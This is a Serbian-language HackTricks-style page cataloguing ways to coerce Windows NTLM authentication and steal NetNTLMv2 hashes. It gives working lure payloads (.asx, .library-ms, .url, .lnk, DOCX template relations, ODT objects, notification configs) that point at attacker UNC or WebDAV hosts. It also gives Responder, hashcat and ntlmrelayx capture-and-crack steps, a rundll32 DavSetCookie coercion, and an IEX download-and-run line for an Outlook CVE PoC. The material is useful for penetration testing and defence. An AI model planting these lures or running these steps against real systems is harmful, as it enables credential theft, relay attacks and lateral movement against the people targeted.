# Mesta za krađu NTLM kredencijala

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje na [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), od preuzimanja Microsoft Word datoteke sa interneta do izvora NTLM leakova: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### SMB share sa dozvolom za upis + UNC mamci koje pokreće Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ako možete **da pišete u share koji korisnici ili zakazani poslovi pregledaju u Explorer-u**, ubacite datoteke čiji metapodaci upućuju na vaš UNC (npr. `\\ATTACKER\share`). Prikazivanje fascikle pokreće **implicitnu SMB autentifikaciju** i šalje **NetNTLMv2** vašem listener-u.<sup>[[1]](#references)</sup>

1. **Generišite mamce** (obuhvata SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/itd.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Postavite ih na deljeni resurs sa dozvolom za upis** (bilo koju fasciklu koju žrtva otvori):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Slušajte i crackujte**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows može da pristupi većem broju fajlova odjednom; za sve što Explorer prikazuje u pregledu (`BROWSE TO FOLDER`) nisu potrebni klikovi.

### Windows Media Player plej-liste (.ASX/.WAX)

Ako možete da navedete metu da otvori ili pregleda Windows Media Player plej-listu koju kontrolišete, možete da leak-ujete Net-NTLMv2 tako što ćete stavku usmeriti na UNC putanju. WMP će pokušati da preuzme navedeni medijum preko SMB-a i implicitno će se autentifikovati.<sup>[[3]](#references)[[4]](#references)</sup>

Primer payload-a:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Tok prikupljanja i crackovanja:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP-ugrađeni .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nebezbedno obrađuje .library-ms datoteke kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke upućuje na udaljenu UNC putanju (npr., \\attacker\share), samo pregledanje/pokretanje .library-ms datoteke unutar ZIP arhive dovodi do toga da Explorer nabroji sadržaj UNC putanje i pošalje NTLM autentifikaciju napadaču. Time se dobija NetNTLMv2 koji može da se razbije offline ili potencijalno relay-uje.<sup>[[2]](#references)</sup>

Minimalni .library-ms koji upućuje na UNC putanju napadača

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operativni koraci
- Napravite .library-ms datoteku sa XML-om iznad (podesite svoju IP adresu/hostname).
- Zip-ujte je (u Windows-u: Send to → Compressed (zipped) folder) i isporučite ZIP metu.
- Pokrenite NTLM capture listener i sačekajte da žrtva otvori .library-ms iz ZIP-a.


### Putanja zvuka podsetnika u kalendaru programa Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows obrađivao je prošireno MAPI svojstvo PidLidReminderFileParameter u stavkama kalendara. Ako bi to svojstvo pokazivalo na UNC putanju (npr. \\attacker\share\alert.wav), Outlook bi se povezao sa SMB deljenim resursom kada bi se aktivirao podsetnik, čime bi procureo korisnikov Net-NTLMv2 bez ikakvog klika. Ovo je zakrpljeno 14. marta 2023, ali je i dalje veoma relevantno za zastarele/neodržavane sisteme i za istorijsku analizu incidenata.<sup>[[5]](#references)</sup>

Brza eksploatacija pomoću PowerShell-a (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Na strani listener-a:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Napomene
- Žrtvi je potrebno samo da Outlook za Windows bude pokrenut kada se aktivira podsetnik.
- leak daje Net‑NTLMv2, pogodan za offline cracking ili relay (ne za pass-the-hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – zaobilaženje CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavna istraživanja pokazala su da je čak i nakon Microsoftove zakrpe iz aprila 2025. za prečice sa UNC ikonama i dalje bilo moguće pokrenuti NTLM autentifikaciju bez ikakvih klikova, tako što se cilj prečice hostuje na UNC putanji, a ikona ostavi lokalno (zaobilaženje zakrpe dobilo je oznaku CVE‑2025‑50154). Samo pregledanje fascikle navodi Explorer da preuzme metapodatke sa udaljenog cilja, čime šalje NTLM na SMB server napadača.<sup>[[6]](#references)</sup>

Minimalni Internet Shortcut payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Programiranje payload-a prečice (.lnk) pomoću PowerShell-a:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ideje za isporuku
- Ubacite prečicu u ZIP i navedite žrtvu da ga pregleda.
- Postavite prečicu na share sa dozvolom za upis koji će žrtva otvoriti.
- Kombinujte je sa drugim mamac-fajlovima u istoj fascikli, kako bi Explorer prikazao njihove preglede.

### No-click .LNK NTLM leak preko ExtraData putanje ikone (CVE‑2026‑25185)

Windows učitava metapodatke `.lnk` fajla tokom **prikaza/pregleda** (iscrtavanja ikone), a ne samo pri pokretanju. CVE‑2026‑25185 pokazuje putanju obrade u kojoj blokovi **ExtraData** navode shell da razreši putanju ikone i pristupi sistemu datoteka **tokom učitavanja**; ako je putanja udaljena, šalje se odlazni NTLM.

Ključni uslovi za aktiviranje (uočeni u `CShellLink::_LoadFromStream`):
- Uključite **DARWIN_PROPS** (`0xa0000006`) u ExtraData (uslov za pozivanje rutine za ažuriranje ikone).
- Uključite **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) sa popunjenim poljem **TargetUnicode**.
- Učitavač proširuje promenljive okruženja u `TargetUnicode` i poziva `PathFileExistsW` nad dobijenom putanjom.

Ako se `TargetUnicode` razreši u UNC putanju (npr. `\\attacker\share\icon.ico`), **samo pregledanje fascikle** koja sadrži prečicu pokreće odlaznu autentifikaciju. Istu putanju učitavanja mogu pokrenuti i **indeksiranje** i **AV skeniranje**, što je čini praktičnom površinom za no-click leak.<sup>[[7]](#references)</sup>

Alati za istraživanje (parser/generator/UI) dostupni su u projektu **LnkMeMaybe** za izradu i pregled ovih struktura bez korišćenja Windows GUI-ja.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / provera akreditiva preko `davclnt.dll,DavSetCookie`

Nativni **WebDAV klijent** može se zloupotrebiti da bi se trenutna logon sesija primorala da se autentifikuje na proizvoljnom **HTTP/WebDAV** endpointu:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Zašto je ovo korisno:
- Protiv **WebDAV servera pod kontrolom napadača**, može da pokrene **NTLM preko HTTP-a** bez postavljanja prilagođenog klijenta.
- Protiv **internih hostova**, ovo je tih način da se **proveri gde se prihvataju ukradeni akreditivi** pre nego što se pređe na lateralno kretanje.<sup>[[9]](#references)</sup>
- Ova komanda je dobra alternativa kada je **SMB egress filtriran**, ali je **HTTP/WebDAV** i dalje dostupan.

Napomene o radu:
- Usluga **WebClient** mora biti pokrenuta na izvornom hostu.
- `rundll32.exe` učitava `davclnt.dll` i prepušta Windows-u da obavi WebDAV autentifikaciju pomoću **akreditiva trenutnog korisnika**.<sup>[[10]](#references)</sup>
- Ako je usmerite ka infrastrukturi koju kontrolišete, koristite HTTP listener/relay koji podržava NTLM, kao što je:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Iz perspektive detekcije, ponovljena izvršavanja `rundll32.exe davclnt.dll,DavSetCookie` prema mnogim internim sistemima snažan su pokazatelj **validacije kredencijala / pripreme za lateralno kretanje nalik na spray**, a ne uobičajenog ponašanja korisnika.<sup>[[9]](#references)[[11]](#references)</sup>

### URI-jevi udaljenih obaveštenja za WebDAV NTLM coercion

Ako aplikacija razrešava adrese iskačućih obaveštenja ili web-prikaza konfigurisane na udaljenoj lokaciji, adresa `file://` može da izazove odlaznu autentifikaciju **bez otvaranja dokumenta ili izvršnog payload-a**. U slučaju AOMEI-ja, obaveštenje veličine jednog piksela upućivalo je na udaljenu WebDAV putanju `DavWWWRoot`. Windows je pokušao integrisanu autentifikaciju na toj adresi, izlažući NetNTLMv2 challenge-response. Okidač je bilo razrešavanje URI-ja, a ne vidljivost iskačućeg obaveštenja; to i dalje zavisi od rukovaoca URI-jima u aplikaciji, [ponašanja Windows WebClient-a](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) i pravilnika za odlaznu autentifikaciju.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

Za razliku od gore navedene coercion metode zasnovane na komandama, ova ulazna tačka zahteva kontrolu nad [software notification configuration](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Prozor veličine jednog piksela i visok prioritet pokazuju da i nenametljivo obaveštenje može naterati klijent da dereferencira URI.<sup>[[16]](#references)</sup>

### Office remote template injection (.docx/.dotm) za izazivanje NTLM autentifikacije

Office dokumenti mogu da upućuju na spoljašnji template. Ako priloženi template postavite na UNC putanju, otvaranjem dokumenta će se izvršiti autentifikacija preko SMB-a.

Minimalne izmene DOCX relacija (unutar word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi template:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Izmenite word/_rels/settings.xml.rels i usmerite rId1337 na svoj UNC:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Ponovo upakujte u .docx i isporučite. Pokrenite SMB listener za hvatanje podataka i sačekajte da se dokument otvori.

### ODT spoljašnji objekat za SMB autentifikaciju

Kada putanja za otpremanje dokumenata prihvata `.odt`, ali cilj ne otvara Office `.docx` datoteke, upotrebite spoljašnji OpenDocument objekat umesto Office šablona. Metasploitov `auxiliary/fileformat/odt_badodt` generiše ODT čiji `content.xml` sadrži referencu `draw:object` koja se učitava pri otvaranju, poput one ispod. Podesite `LHOST` na SMB listener, otpremite ODT kroz dozvoljeni postupak i uhvatite odlazni NetNTLMv2 odgovor kada ga korisnik ili procesor dokumenata otvori. Provera ekstenzije datoteke ne pregleda ugrađeni URL; ograničenja dolaznog NTLM-a na cilju ne moraju nužno da spreče odlaznu autentifikaciju.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Za ideje o relay-u ili zloupotrebi NTLM-a nakon hvatanja kredencijala, pogledajte:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Mamci na upisivom deljenom resursu + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM ranjivosti: Nezakrpljene pretnje eskalacije privilegija u Microsoftu](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft ublažava Outlook EoP (CVE‑2023‑23397) i objašnjava NTLM leak preko PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, jedan NTLM: Zaobilaženje Microsoft bezbednosne zakrpe (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Pregled CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe alati](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Kada IT podrška pozove: Analiza ModeloRAT kampanje od Teams-a do kompromitovanja domena](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – datoteka zaglavlja davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV zahtev](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Mesta od interesa za krađu Netntlm hash-eva](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — Hvatanje NTLM-a pomoću spoljnog ODT objekta](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group i Mandiant – Istraživanje privremenog menjanja lanca snabdevanja](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
